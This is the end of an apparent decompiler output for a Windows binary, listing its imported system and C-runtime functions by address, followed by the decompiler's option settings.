/* 0x004a1080       0 */ /* unknown */ void 	__imp__CreateMutexA;
/* 0x004a1084       0 */ /* unknown */ void 	__imp__CopyFileA;
/* 0x004a1088       0 */ /* unknown */ void 	__imp__DeleteFileA;
/* 0x004a108c       0 */ /* unknown */ void 	__imp__SetFileAttributesA;
/* 0x004a1090       0 */ /* unknown */ void 	__imp__GetModuleFileNameA;
/* 0x004a1094       0 */ /* unknown */ void 	__imp__FindNextFileA;
/* 0x004a1098       0 */ /* unknown */ void 	__imp__GetSystemTimeAsFileTime;
/* 0x004a109c       0 */ /* unknown */ void 	__imp__Sleep;
/* 0x004a10a0       0 */ /* unknown */ void 	__imp__ExitThread;
/* 0x004a10a4       0 */ /* unknown */ void 	__imp__WaitForSingleObject;
/* 0x004a10a8       0 */ /* unknown */ void 	__imp__CreateProcessA;
/* 0x004a10ac       0 */ /* unknown */ void 	__imp__CreateThread;
/* 0x004a10b0       0 */ /* unknown */ void 	__imp__GetTickCount;
/* 0x004a10b4       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x004a10b8       0 */ /* unknown */ void 	__imp__GetTimeZoneInformation;
/* 0x004a10bc       0 */ /* unknown */ void 	__imp__UnmapViewOfFile;
/* 0x004a10c0       0 */ /* unknown */ void 	__imp__FileTimeToLocalFileTime;
/* 0x004a10c4       0 */ /* unknown */ void 	__imp__GetLocalTime;
/* 0x004a10c8       0 */ /* unknown */ void 	__imp__lstrcmpA;
/* 0x004a10cc       0 */ /* unknown */ void 	__imp__FindFirstFileA;
/* 0x004a10d0       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x004a10d4       0 */ /* unknown */ void 	__imp__HeapFree;
/* 0x004a10d8       0 */ /* unknown */ void 	__imp__HeapAlloc;
/* 0x004a10dc       0 */ /* unknown */ void 	__imp__GetProcessHeap;
/* 0x004a10e0       0 */ /* unknown */ void 	__imp__lstrcpynA;
/* 0x004a10e4       0 */ /* unknown */ void 	__imp__lstrcmpiA;
/* 0x004a10e8       0 */ /* unknown */ void 	__imp__GlobalFree;
/* 0x004a10ec       0 */ /* unknown */ void 	__imp__InterlockedDecrement;
/* 0x004a10f0       0 */ /* unknown */ void 	__imp__InterlockedIncrement;
/* 0x004a10f4       0 */ /* unknown */ void 	__imp__ReadFile;
/* 0x004a10f8       0 */ /* unknown */ void 	__imp__GetEnvironmentVariableA;
/* 0x004a10fc       0 */ /* unknown */ void 	__imp__GetWindowsDirectoryA;
/* 0x004a1100       0 */ /* unknown */ void 	__imp__FindClose;
/* 0x004a1108       0 */ /* unknown */ void 	__imp__toupper;
/* 0x004a110c       0 */ /* unknown */ void 	__imp____mb_cur_max;
/* 0x004a1110       0 */ /* unknown */ void 	__imp___isctype;
/* 0x004a1114       0 */ /* unknown */ void 	__imp___pctype;
/* 0x004a1118       0 */ /* unknown */ void 	__imp__memcpy;
/* 0x004a111c       0 */ /* unknown */ void 	__imp__tolower;
/* 0x004a1120       0 */ /* unknown */ void 	__imp__memset;
/* 0x004a1128       0 */ /* unknown */ void 	__imp__wsprintfA;
/* 0x004a112c       0 */ /* unknown */ void 	__imp__wvsprintfA;
/* 0x004a1130       0 */ /* unknown */ void 	__imp__CharLowerA;
/* 0x004a1134       0 */ /* unknown */ void 	__imp__CharUpperBuffA;
/* 0x004a1138       0 */ /* unknown */ void 	__imp__CharUpperA;
/* 0x004a462e       0 */ /* unknown */ void 	__entry_point__;
/* 0x004a8ab8       0 */ /* unknown */ void 	memset;
/* 0x004a8abe       0 */ /* unknown */ void 	memcpy;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: +dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
